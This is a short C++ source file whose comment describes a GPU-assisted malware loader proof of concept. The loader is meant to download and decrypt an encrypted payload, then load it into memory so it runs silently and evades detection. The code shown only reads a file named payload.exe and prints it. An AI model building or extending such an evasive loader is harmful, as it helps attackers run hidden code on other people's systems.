#include <bits/stdc++.h>
#include <fstream>
#include "read.cpp"

#define DEBUG 1
#define filename "payload.exe"

namespace fs = std::filesystem;

/*
	Author: Diego Noria
	Description: This is a Graphics Processing Unit Assisted proof of concept 
	It downloads and reads an encrypted payload file decrypts via the GPU,
	writes it to the disk, and then loads it into memmory to be executed.
	The goal is to keep the detection surface area to a minimum and execute 
	silently on the system without the host knowing.
*/

int main(void) {
	
	fs::path file = fs::current_path().string()+"\\"+filename;
	
	std::string fortnite = read_payload(file);
	
	std::cout << fortnite;
	
	return 0;
}